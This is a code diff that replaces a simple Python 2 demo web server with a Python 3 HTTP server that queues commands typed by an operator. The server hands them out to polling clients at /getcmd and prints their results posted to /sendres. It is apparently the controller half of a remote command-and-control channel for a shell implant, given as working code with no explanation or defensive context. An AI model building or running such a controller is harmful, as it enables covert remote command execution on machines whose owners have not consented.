@@ -1,37 +1,85 @@
-#-*- coding:utf-8 -*-
-import BaseHTTPServer
-#RequestHandler 繼承 BaseHTTPRequestHandler ，所以他自身就有一個path的數據成員
-class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
-    #
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import sys, queue, time, threading, readline, os
+
+mq = queue.Queue()
+host = ('', 8088)
+SYSTEM_STATE = 'live'
+
+
+class ExecuteServer(BaseHTTPRequestHandler):
     def do_GET(self):
-        #self.send_response(200)
-        #self.send_header('Content-Type','text/html')
-        #self.send_header('Content-Length',str(len(self.Page)))
-        #self.end_headers()
-        #self.wfile.write(self.Page)
-        page=self.create_page()
-        self.send_content(page)
+        if self.path == '/getcmd':
+            self.getcmd_handler()
+        if self.path == '/connect':
+            self.connect_handler()
+        if self.path == '/exit':
+            self.exit_handler()
 
-    def send_content(self,page):
+
+    def do_POST(self):
+        if self.path == '/sendres':
+            self.sendres_handler()
+
+    def log_message(self, format, *args):
+        pass
+
+    def connect_handler(self):
+        try:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+        except:
+            pass
+
+    def exit_handler(self):
+        try:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            global SYSTEM_STATE
+            SYSTEM_STATE = 'die'
+        except:
+            pass
+
+    def getcmd_handler(self):
+        try:
+            if not mq.empty():
+                data = mq.get()
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(data.encode())
+            else:
+                self.send_response(404)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+        except:
+            pass
+
+    def sendres_handler(self):
+        content_len = int(self.headers.get('Content-Length'))
+        post_body = self.rfile.read(content_len)
+        sys.stdout.write(post_body.decode())
+        sys.stdout.flush()
         self.send_response(200)
-        self.send_header('Content-Type','text/html')
-        self.send_header('Content-Length','text.html')
+        self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(page)
 
-    #self.date_time_string 和 client_address[0/1]等等都是父類的書據成員
-    def create_page(self):
-        values={
-            'date_time':self.date_time_string(),
-            'client_host':self.client_address[0],
-            'client_port':self.client_address[1],
-            'command':self.command,
-            'path':self.path
-        }
-        page=self.Page.format(**values)
-        return page
+
+
+def start_execute_server():
+    server = HTTPServer(host, ExecuteServer)
+    print("Starting server, listen at port %s" % host[1])
+    server.serve_forever()
+
+
+def main():
+    t = threading.Thread(target=start_execute_server)
+    t.setDaemon(True)
+    t.start()
+    while SYSTEM_STATE == 'live':
+        data = input('')
+        mq.put(data)
 
 if __name__ == '__main__':
-    serverAddress = ('', 8771)
-    server = BaseHTTPServer.HTTPServer(serverAddress, RequestHandler)
-    server.serve_forever()
+    main()
